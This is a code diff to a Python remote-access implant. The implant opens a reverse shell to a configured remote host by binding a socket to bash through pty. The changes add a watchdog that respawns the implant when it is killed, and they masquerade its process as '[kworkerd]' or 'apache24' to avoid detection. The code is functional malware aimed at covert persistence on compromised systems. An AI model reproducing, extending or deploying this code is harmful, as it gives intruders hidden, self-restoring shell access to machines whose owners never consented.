@@ -12,10 +12,8 @@ import pty
 import tempfile
 
 
-PROCESS_NAME = '[kworkerd]'
-
-
 class EnvKeys:
+    KEEP_ALIVE_PID = 'KEEP_ALIVE_PID'
     LAYER = 'LAYER'
     NO_RESTART = 'NO_RESTART'
     OPEN_SHELL_CLASSIC_PORT = 'OPEN_SHELL_CLASSIC_PORT'
@@ -27,6 +25,7 @@ class EnvKeys:
 
 
 class Env:
+    keep_alive_pid = os.environ.get(EnvKeys.KEEP_ALIVE_PID)
     layer = int(os.environ.get(EnvKeys.LAYER, '0'))
     no_restart = bool(os.environ.get(EnvKeys.NO_RESTART))
     open_shell_classic_port = os.environ.get(EnvKeys.OPEN_SHELL_CLASSIC_PORT, None)
@@ -48,13 +47,18 @@ class Process:
     def get_cmd_output(cmd: str, strip_new_line=False) -> [int, bytes]:
         proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
         if strip_new_line and len(proc.stdout) > 0 and proc.stdout[-1] == b'\n'[0]:
-            return proc.returncode, proc.stdout[:-1]
+            return proc.returncode, bytes(proc.stdout[:-1])
         else:
             return proc.returncode, proc.stdout
 
     @staticmethod
     def spawn_self_with_env(env: dict):
         subprocess.run(['python3'], env={**os.environ, **env}, input=Config.code, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    @staticmethod
+    def is_running_with_pid(pid: str):
+        grep = Process.get_cmd_output(f'ps -ax -o pid | grep {pid}')[1]
+        return len(grep) > 0
 
 
 class Message:
@@ -252,6 +256,12 @@ def main_detached():
         [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
         pty.spawn("/bin/bash")
 
+    elif Env.keep_alive_pid is not None:
+        os.environ.pop(EnvKeys.KEEP_ALIVE_PID)
+        while Process.is_running_with_pid(Env.keep_alive_pid):
+            sleep(1)
+        Process.spawn_self_with_env({})
+
     else:
         try:
             sock = socket.create_connection((Env.remote_ip, Env.remote_port))
@@ -259,6 +269,7 @@ def main_detached():
             Communication.on_communication_broken()
         else:
             Communication.initialise_communication(sock)
+            Process.spawn_self_with_env({EnvKeys.KEEP_ALIVE_PID: str(os.getpid())})
             MessageProcessor.process_messages_forever()
 
 
@@ -281,8 +292,10 @@ def main():
 
         if any([Env.open_shell_classic_port, Env.open_shell_tunneled_conversation_uid]):
             process_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+        elif Env.keep_alive_pid is not None:
+            process_name = 'apache24'
         else:
-            process_name = PROCESS_NAME
+            process_name = '[kworkerd]'
         grand_child.stdin.write(f'exec -a {process_name} python3\n'.encode())
         grand_child.stdin.flush()
         grand_child.stdin.write(Config.code)
